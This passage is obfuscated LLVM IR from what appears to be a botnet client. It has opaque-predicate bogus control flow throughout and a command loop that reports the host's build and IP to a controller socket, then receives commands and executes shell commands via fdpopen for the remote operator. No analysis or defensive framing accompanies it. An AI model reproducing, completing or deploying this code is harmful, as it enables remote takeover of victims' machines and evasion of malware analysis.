  %129 = load i32, i32* @y.116
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %127
  %136 = load i32, i32* @mainCommSock, align 4
  %137 = call i8* @getBuild()
  %138 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %139 = call i8* @inet_ntoa(i32 %138) #5
  %140 = call i32 (i32, i8*, ...) @sockprintf(i32 %136, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.493, i32 0, i32 0), i8* %137, i8* %139)
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %141 = load i32, i32* @x.115
  %142 = load i32, i32* @y.116
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %149

; <label>:149:                                    ; preds = %originalBBpart2155, %546, %404, %334, %originalBBpart223
  %150 = load i32, i32* @mainCommSock, align 4
  %151 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %152 = call i32 @recvLine(i32 %150, i8* %151, i32 4096)
  store i32 %152, i32* %19, align 4
  %153 = icmp ne i32 %152, -1
  br i1 %153, label %154, label %657

; <label>:154:                                    ; preds = %149
  store i32 0, i32* %20, align 4
  br label %155

; <label>:155:                                    ; preds = %322, %154
  %156 = load i32, i32* @x.115
  %157 = load i32, i32* @y.116
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %155
  %164 = load i32, i32* %20, align 4
  %165 = sext i32 %164 to i64
  %166 = load i64, i64* @numpids, align 8
  %167 = icmp ult i64 %165, %166
  %168 = load i32, i32* @x.115
  %169 = load i32, i32* @y.116
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %167, label %176, label %325

; <label>:176:                                    ; preds = %originalBBpart227
  %177 = load i32*, i32** @pids, align 8
  %178 = load i32, i32* %20, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds i32, i32* %177, i64 %179
  %181 = load i32, i32* %180, align 4
  %182 = call i32 @waitpid(i32 %181, i32* null, i32 1)
  %183 = icmp sgt i32 %182, 0
  br i1 %183, label %184, label %305

; <label>:184:                                    ; preds = %176
  %185 = load i32, i32* @x.115
  %186 = load i32, i32* @y.116
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %184
  %193 = load i32, i32* %20, align 4
  %194 = add nsw i32 %193, 1
  store i32 %194, i32* %22, align 4
  %195 = load i32, i32* @x.115
  %196 = load i32, i32* @y.116
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBBpart235, label %originalBB29alteredBB

originalBBpart235:                                ; preds = %originalBB29
  br label %203

; <label>:203:                                    ; preds = %219, %originalBBpart235
  %204 = load i32, i32* %22, align 4
  %205 = zext i32 %204 to i64
  %206 = load i64, i64* @numpids, align 8
  %207 = icmp ult i64 %205, %206
  br i1 %207, label %208, label %222

; <label>:208:                                    ; preds = %203
  %209 = load i32*, i32** @pids, align 8
  %210 = load i32, i32* %22, align 4
  %211 = zext i32 %210 to i64
  %212 = getelementptr inbounds i32, i32* %209, i64 %211
  %213 = load i32, i32* %212, align 4
  %214 = load i32*, i32** @pids, align 8
  %215 = load i32, i32* %22, align 4
  %216 = sub i32 %215, 1
  %217 = zext i32 %216 to i64
  %218 = getelementptr inbounds i32, i32* %214, i64 %217
  store i32 %213, i32* %218, align 4
  br label %219

; <label>:219:                                    ; preds = %208
  %220 = load i32, i32* %22, align 4
  %221 = add i32 %220, 1
  store i32 %221, i32* %22, align 4
  br label %203

; <label>:222:                                    ; preds = %203
  %223 = load i32, i32* @x.115
  %224 = load i32, i32* @y.116
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %222
  %231 = load i32*, i32** @pids, align 8
  %232 = load i32, i32* %22, align 4
  %233 = sub i32 %232, 1
  %234 = zext i32 %233 to i64
  %235 = getelementptr inbounds i32, i32* %231, i64 %234
  store i32 0, i32* %235, align 4
  %236 = load i64, i64* @numpids, align 8
  %237 = add i64 %236, -1
  store i64 %237, i64* @numpids, align 8
  %238 = load i64, i64* @numpids, align 8
  %239 = add i64 %238, 1
  %240 = mul i64 %239, 4
  %241 = call noalias i8* @malloc(i64 %240) #5
  %242 = bitcast i8* %241 to i32*
  store i32* %242, i32** %21, align 8
  store i32 0, i32* %22, align 4
  %243 = load i32, i32* @x.115
  %244 = load i32, i32* @y.116
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBBpart273, label %originalBB37alteredBB

originalBBpart273:                                ; preds = %originalBB37
  br label %251

; <label>:251:                                    ; preds = %originalBBpart289, %originalBBpart273
  %252 = load i32, i32* %22, align 4
  %253 = zext i32 %252 to i64
  %254 = load i64, i64* @numpids, align 8
  %255 = icmp ult i64 %253, %254
  br i1 %255, label %256, label %285

; <label>:256:                                    ; preds = %251
  %257 = load i32*, i32** @pids, align 8
  %258 = load i32, i32* %22, align 4
  %259 = zext i32 %258 to i64
  %260 = getelementptr inbounds i32, i32* %257, i64 %259
  %261 = load i32, i32* %260, align 4
  %262 = load i32*, i32** %21, align 8
  %263 = load i32, i32* %22, align 4
  %264 = zext i32 %263 to i64
  %265 = getelementptr inbounds i32, i32* %262, i64 %264
  store i32 %261, i32* %265, align 4
  br label %266

; <label>:266:                                    ; preds = %256
  %267 = load i32, i32* @x.115
  %268 = load i32, i32* @y.116
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %266
  %275 = load i32, i32* %22, align 4
  %276 = add i32 %275, 1
  store i32 %276, i32* %22, align 4
  %277 = load i32, i32* @x.115
  %278 = load i32, i32* @y.116
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBBpart289, label %originalBB75alteredBB

originalBBpart289:                                ; preds = %originalBB75
  br label %251

; <label>:285:                                    ; preds = %251
  %286 = load i32, i32* @x.115
  %287 = load i32, i32* @y.116
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %285
  %294 = load i32*, i32** @pids, align 8
  %295 = bitcast i32* %294 to i8*
  call void @free(i8* %295) #5
  %296 = load i32*, i32** %21, align 8
  store i32* %296, i32** @pids, align 8
  %297 = load i32, i32* @x.115
  %298 = load i32, i32* @y.116
  %299 = sub i32 %297, 1
  %300 = mul i32 %297, %299
  %301 = urem i32 %300, 2
  %302 = icmp eq i32 %301, 0
  %303 = icmp slt i32 %298, 10
  %304 = or i1 %302, %303
  br i1 %304, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br label %305

; <label>:305:                                    ; preds = %originalBBpart293, %176
  %306 = load i32, i32* @x.115
  %307 = load i32, i32* @y.116
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %305
  %314 = load i32, i32* @x.115
  %315 = load i32, i32* @y.116
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br label %322

; <label>:322:                                    ; preds = %originalBBpart297
  %323 = load i32, i32* %20, align 4
  %324 = add nsw i32 %323, 1
  store i32 %324, i32* %20, align 4
  br label %155

; <label>:325:                                    ; preds = %originalBBpart227
  %326 = load i32, i32* %19, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i64 0, i64 %327
  store i8 0, i8* %328, align 1
  %329 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %329)
  %330 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %331 = call i8* @strstr(i8* %330, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0)) #10
  %332 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %333 = icmp eq i8* %331, %332
  br i1 %333, label %334, label %337

; <label>:334:                                    ; preds = %325
  %335 = load i32, i32* @mainCommSock, align 4
  %336 = call i32 (i32, i8*, ...) @sockprintf(i32 %335, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.494, i32 0, i32 0))
  br label %149

; <label>:337:                                    ; preds = %325
  %338 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %339 = call i8* @strstr(i8* %338, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.495, i32 0, i32 0)) #10
  %340 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  %341 = icmp eq i8* %339, %340
  br i1 %341, label %342, label %343

; <label>:342:                                    ; preds = %337
  call void @exit(i32 0) #14
  unreachable

; <label>:343:                                    ; preds = %337
  %344 = getelementptr inbounds [4096 x i8], [4096 x i8]* %18, i32 0, i32 0
  store i8* %344, i8** %23, align 8
  %345 = load i8*, i8** %23, align 8
  %346 = load i8, i8* %345, align 1
  %347 = zext i8 %346 to i32
  %348 = icmp eq i32 %347, 33
  br i1 %348, label %349, label %640

; <label>:349:                                    ; preds = %343
  %350 = load i8*, i8** %23, align 8
  %351 = getelementptr inbounds i8, i8* %350, i64 1
  store i8* %351, i8** %24, align 8
  br label %352

; <label>:352:                                    ; preds = %380, %349
  %353 = load i8*, i8** %24, align 8
  %354 = load i8, i8* %353, align 1
  %355 = zext i8 %354 to i32
  %356 = icmp ne i32 %355, 32
  br i1 %356, label %357, label %378

; <label>:357:                                    ; preds = %352
  %358 = load i32, i32* @x.115
  %359 = load i32, i32* @y.116
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %357
  %366 = load i8*, i8** %24, align 8
  %367 = load i8, i8* %366, align 1
  %368 = zext i8 %367 to i32
  %369 = icmp ne i32 %368, 0
  %370 = load i32, i32* @x.115
  %371 = load i32, i32* @y.116
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %378

; <label>:378:                                    ; preds = %originalBBpart2101, %352
  %379 = phi i1 [ false, %352 ], [ %369, %originalBBpart2101 ]
  br i1 %379, label %380, label %383

; <label>:380:                                    ; preds = %378
  %381 = load i8*, i8** %24, align 8
  %382 = getelementptr inbounds i8, i8* %381, i32 1
  store i8* %382, i8** %24, align 8
  br label %352

; <label>:383:                                    ; preds = %378
  %384 = load i32, i32* @x.115
  %385 = load i32, i32* @y.116
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %383
  %392 = load i8*, i8** %24, align 8
  %393 = load i8, i8* %392, align 1
  %394 = zext i8 %393 to i32
  %395 = icmp eq i32 %394, 0
  %396 = load i32, i32* @x.115
  %397 = load i32, i32* @y.116
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br i1 %395, label %404, label %405

; <label>:404:                                    ; preds = %originalBBpart2105
  br label %149

; <label>:405:                                    ; preds = %originalBBpart2105
  %406 = load i32, i32* @x.115
  %407 = load i32, i32* @y.116
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %405
  %414 = load i8*, i8** %24, align 8
  store i8 0, i8* %414, align 1
  %415 = load i8*, i8** %23, align 8
  %416 = getelementptr inbounds i8, i8* %415, i64 1
  store i8* %416, i8** %24, align 8
  %417 = load i8*, i8** %23, align 8
  %418 = load i8*, i8** %24, align 8
  %419 = call i64 @strlen(i8* %418) #10
  %420 = getelementptr inbounds i8, i8* %417, i64 %419
  %421 = getelementptr inbounds i8, i8* %420, i64 2
  store i8* %421, i8** %23, align 8
  %422 = load i32, i32* @x.115
  %423 = load i32, i32* @y.116
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br label %430

; <label>:430:                                    ; preds = %450, %originalBBpart2109
  %431 = load i8*, i8** %23, align 8
  %432 = load i8*, i8** %23, align 8
  %433 = call i64 @strlen(i8* %432) #10
  %434 = sub i64 %433, 1
  %435 = getelementptr inbounds i8, i8* %431, i64 %434
  %436 = load i8, i8* %435, align 1
  %437 = zext i8 %436 to i32
  %438 = icmp eq i32 %437, 10
  br i1 %438, label %448, label %439

; <label>:439:                                    ; preds = %430
  %440 = load i8*, i8** %23, align 8
  %441 = load i8*, i8** %23, align 8
  %442 = call i64 @strlen(i8* %441) #10
  %443 = sub i64 %442, 1
  %444 = getelementptr inbounds i8, i8* %440, i64 %443
  %445 = load i8, i8* %444, align 1
  %446 = zext i8 %445 to i32
  %447 = icmp eq i32 %446, 13
  br label %448

; <label>:448:                                    ; preds = %439, %430
  %449 = phi i1 [ true, %430 ], [ %447, %439 ]
  br i1 %449, label %450, label %456

; <label>:450:                                    ; preds = %448
  %451 = load i8*, i8** %23, align 8
  %452 = load i8*, i8** %23, align 8
  %453 = call i64 @strlen(i8* %452) #10
  %454 = sub i64 %453, 1
  %455 = getelementptr inbounds i8, i8* %451, i64 %454
  store i8 0, i8* %455, align 1
  br label %430

; <label>:456:                                    ; preds = %448
  %457 = load i8*, i8** %23, align 8
  store i8* %457, i8** %25, align 8
  br label %458

; <label>:458:                                    ; preds = %originalBBpart2117, %456
  %459 = load i32, i32* @x.115
  %460 = load i32, i32* @y.116
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %458
  %467 = load i8*, i8** %23, align 8
  %468 = load i8, i8* %467, align 1
  %469 = zext i8 %468 to i32
  %470 = icmp ne i32 %469, 32
  %471 = load i32, i32* @x.115
  %472 = load i32, i32* @y.116
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  br i1 %470, label %479, label %484

; <label>:479:                                    ; preds = %originalBBpart2113
  %480 = load i8*, i8** %23, align 8
  %481 = load i8, i8* %480, align 1
  %482 = zext i8 %481 to i32
  %483 = icmp ne i32 %482, 0
  br label %484

; <label>:484:                                    ; preds = %479, %originalBBpart2113
  %485 = phi i1 [ false, %originalBBpart2113 ], [ %483, %479 ]
  br i1 %485, label %486, label %505

; <label>:486:                                    ; preds = %484
  %487 = load i32, i32* @x.115
  %488 = load i32, i32* @y.116
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBB115, label %originalBB115alteredBB

originalBB115:                                    ; preds = %originalBB115alteredBB, %486
  %495 = load i8*, i8** %23, align 8
  %496 = getelementptr inbounds i8, i8* %495, i32 1
  store i8* %496, i8** %23, align 8
  %497 = load i32, i32* @x.115
  %498 = load i32, i32* @y.116
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBBpart2117, label %originalBB115alteredBB

originalBBpart2117:                               ; preds = %originalBB115
  br label %458

; <label>:505:                                    ; preds = %484
  %506 = load i8*, i8** %23, align 8
  store i8 0, i8* %506, align 1
  %507 = load i8*, i8** %23, align 8
  %508 = getelementptr inbounds i8, i8* %507, i32 1
  store i8* %508, i8** %23, align 8
  %509 = load i8*, i8** %25, align 8
  store i8* %509, i8** %26, align 8
  br label %510

; <label>:510:                                    ; preds = %originalBBpart2121, %505
  %511 = load i8*, i8** %26, align 8
  %512 = load i8, i8* %511, align 1
  %513 = icmp ne i8 %512, 0
  br i1 %513, label %514, label %539

; <label>:514:                                    ; preds = %510
  %515 = load i32, i32* @x.115
  %516 = load i32, i32* @y.116
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB119, label %originalBB119alteredBB

originalBB119:                                    ; preds = %originalBB119alteredBB, %514
  %523 = load i8*, i8** %26, align 8
  %524 = load i8, i8* %523, align 1
  %525 = zext i8 %524 to i32
  %526 = call i32 @toupper(i32 %525) #10
  %527 = trunc i32 %526 to i8
  %528 = load i8*, i8** %26, align 8
  store i8 %527, i8* %528, align 1
  %529 = load i8*, i8** %26, align 8
  %530 = getelementptr inbounds i8, i8* %529, i32 1
  store i8* %530, i8** %26, align 8
  %531 = load i32, i32* @x.115
  %532 = load i32, i32* @y.116
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBBpart2121, label %originalBB119alteredBB

originalBBpart2121:                               ; preds = %originalBB119
  br label %510

; <label>:539:                                    ; preds = %510
  %540 = load i8*, i8** %25, align 8
  %541 = call i32 @strcmp(i8* %540, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.496, i32 0, i32 0)) #10
  %542 = icmp eq i32 %541, 0
  br i1 %542, label %543, label %566

; <label>:543:                                    ; preds = %539
  %544 = call i32 @listFork()
  %545 = icmp ne i32 %544, 0
  br i1 %545, label %546, label %547

; <label>:546:                                    ; preds = %543
  br label %149

; <label>:547:                                    ; preds = %543
  %548 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %548, i8 0, i64 1024, i32 16, i1 false)
  %549 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  %550 = load i8*, i8** %23, align 8
  %551 = call i32 (i8*, i8*, ...) @szprintf(i8* %549, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.497, i32 0, i32 0), i8* %550)
  %552 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  %553 = call i32 @fdpopen(i8* %552, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i32 0, i32 0))
  store i32 %553, i32* %28, align 4
  br label %554

; <label>:554:                                    ; preds = %559, %547
  %555 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  %556 = load i32, i32* %28, align 4
  %557 = call i8* @fdgets(i8* %555, i32 1024, i32 %556)
  %558 = icmp ne i8* %557, null
  br i1 %558, label %559, label %563

; <label>:559:                                    ; preds = %554
  %560 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  call void @trim(i8* %560)
  %561 = getelementptr inbounds [1024 x i8], [1024 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %561, i8 0, i64 1024, i32 16, i1 false)
  %562 = call i32 @sleep(i32 1)
  br label %554

; <label>:563:                                    ; preds = %554
  %564 = load i32, i32* %28, align 4
  %565 = call i32 @fdpclose(i32 %564)
  call void @exit(i32 0) #14
  unreachable

; <label>:566:                                    ; preds = %539
  store i32 1, i32* %30, align 4
  %567 = load i8*, i8** %23, align 8
  %568 = call i8* @strtok(i8* %567, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.498, i32 0, i32 0)) #5
  store i8* %568, i8** %31, align 8
  %569 = load i8*, i8** %25, align 8
  %570 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 0
  store i8* %569, i8** %570, align 16
  br label %571

; <label>:571:                                    ; preds = %618, %566
  %572 = load i8*, i8** %31, align 8
  %573 = icmp ne i8* %572, null
  br i1 %573, label %574, label %620

; <label>:574:                                    ; preds = %571
  %575 = load i8*, i8** %31, align 8
  %576 = load i8, i8* %575, align 1
  %577 = zext i8 %576 to i32
  %578 = icmp ne i32 %577, 10
  br i1 %578, label %579, label %618

; <label>:579:                                    ; preds = %574
  %580 = load i32, i32* @x.115
  %581 = load i32, i32* @y.116
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBB123, label %originalBB123alteredBB

originalBB123:                                    ; preds = %originalBB123alteredBB, %579
  %588 = load i8*, i8** %31, align 8
  %589 = call i64 @strlen(i8* %588) #10
  %590 = add i64 %589, 1
  %591 = call noalias i8* @malloc(i64 %590) #5
  %592 = load i32, i32* %30, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %593
  store i8* %591, i8** %594, align 8
  %595 = load i32, i32* %30, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %596
  %598 = load i8*, i8** %597, align 8
  %599 = load i8*, i8** %31, align 8
  %600 = call i64 @strlen(i8* %599) #10
  %601 = add i64 %600, 1
  call void @llvm.memset.p0i8.i64(i8* %598, i8 0, i64 %601, i32 1, i1 false)
  %602 = load i32, i32* %30, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %603
  %605 = load i8*, i8** %604, align 8
  %606 = load i8*, i8** %31, align 8
  %607 = call i8* @strcpy(i8* %605, i8* %606) #5
  %608 = load i32, i32* %30, align 4
  %609 = add nsw i32 %608, 1
  store i32 %609, i32* %30, align 4
  %610 = load i32, i32* @x.115
  %611 = load i32, i32* @y.116
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBBpart2151, label %originalBB123alteredBB

originalBBpart2151:                               ; preds = %originalBB123
  br label %618

; <label>:618:                                    ; preds = %originalBBpart2151, %574
  %619 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.498, i32 0, i32 0)) #5
  store i8* %619, i8** %31, align 8
  br label %571

; <label>:620:                                    ; preds = %571
  %621 = load i32, i32* %30, align 4
  %622 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i32 0, i32 0
  call void @processCmd(i32 %621, i8** %622)
  %623 = load i32, i32* %30, align 4
  %624 = icmp sgt i32 %623, 1
  br i1 %624, label %625, label %639

; <label>:625:                                    ; preds = %620
  store i32 1, i32* %32, align 4
  store i32 1, i32* %32, align 4
  br label %626

; <label>:626:                                    ; preds = %635, %625
  %627 = load i32, i32* %32, align 4
  %628 = load i32, i32* %30, align 4
  %629 = icmp slt i32 %627, %628
  br i1 %629, label %630, label %638

; <label>:630:                                    ; preds = %626
  %631 = load i32, i32* %32, align 4
  %632 = sext i32 %631 to i64
  %633 = getelementptr inbounds [10 x i8*], [10 x i8*]* %29, i64 0, i64 %632
  %634 = load i8*, i8** %633, align 8
  call void @free(i8* %634) #5
  br label %635

; <label>:635:                                    ; preds = %630
  %636 = load i32, i32* %32, align 4
  %637 = add nsw i32 %636, 1
  store i32 %637, i32* %32, align 4
  br label %626

; <label>:638:                                    ; preds = %626
  br label %639

; <label>:639:                                    ; preds = %638, %620
  br label %640

; <label>:640:                                    ; preds = %639, %343
  %641 = load i32, i32* @x.115
  %642 = load i32, i32* @y.116
  %643 = sub i32 %641, 1
  %644 = mul i32 %641, %643
  %645 = urem i32 %644, 2
  %646 = icmp eq i32 %645, 0
  %647 = icmp slt i32 %642, 10
  %648 = or i1 %646, %647
  br i1 %648, label %originalBB153, label %originalBB153alteredBB

originalBB153:                                    ; preds = %originalBB153alteredBB, %640
  %649 = load i32, i32* @x.115
  %650 = load i32, i32* @y.116
  %651 = sub i32 %649, 1
  %652 = mul i32 %649, %651
  %653 = urem i32 %652, 2
  %654 = icmp eq i32 %653, 0
  %655 = icmp slt i32 %650, 10
  %656 = or i1 %654, %655
  br i1 %656, label %originalBBpart2155, label %originalBB153alteredBB

originalBBpart2155:                               ; preds = %originalBB153
  br label %149

; <label>:657:                                    ; preds = %149
  %658 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.499, i32 0, i32 0))
  br label %122
                                                  ; No predecessors!
  %660 = load i32, i32* %11, align 4
  ret i32 %660

originalBBalteredBB:                              ; preds = %originalBB, %2
  %661 = alloca i32, align 4
  %662 = alloca i32, align 4
  %663 = alloca i8**, align 8
  %664 = alloca i8*, align 8
  %665 = alloca i32, align 4
  %666 = alloca i32, align 4
  %667 = alloca i32, align 4
  %668 = alloca [4096 x i8], align 16
  %669 = alloca i32, align 4
  %670 = alloca i32, align 4
  %671 = alloca i32*, align 8
  %672 = alloca i32, align 4
  %673 = alloca i8*, align 8
  %674 = alloca i8*, align 8
  %675 = alloca i8*, align 8
  %676 = alloca i8*, align 8
  %677 = alloca [1024 x i8], align 16
  %678 = alloca i32, align 4
  %679 = alloca [10 x i8*], align 16
  %680 = alloca i32, align 4
  %681 = alloca i8*, align 8
  %682 = alloca i32, align 4
  store i32 0, i32* %661, align 4
  store i32 %0, i32* %662, align 4
  store i8** %1, i8*** %663, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.490, i32 0, i32 0), i8** %664, align 8
  %683 = call i8* @getBuild()
  %684 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %685 = call i8* @inet_ntoa(i32 %684) #5
